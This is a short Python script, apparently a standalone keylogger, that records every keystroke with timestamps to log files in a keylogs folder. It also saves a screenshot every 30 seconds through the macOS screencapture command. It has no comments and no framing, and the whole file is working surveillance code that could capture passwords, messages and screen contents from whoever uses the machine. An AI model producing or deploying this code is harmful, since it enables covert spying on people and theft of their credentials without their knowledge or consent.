import os
import threading
from datetime import datetime
import logging
from pynput.keyboard import Key, Listener

def take_screenshots():
    threading.Timer(30.0, take_screenshots).start()
    time = "{:%B-%d-%Y-%H-%M-%S}".format(datetime.now())
    os.system('screencapture screenshots/' + time + '.png')

def on_press(key):
    logging.info(str(key))

def keylogger():
    logging.basicConfig(filename=("keylogs/" + "{:%B-%d-%Y-%H-%M-%S}".format(datetime.now()) + '.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    with Listener(on_press=on_press) as L:
        L.join()

if __name__ == '__main__':
    take_screenshots()
    keylogger()
    
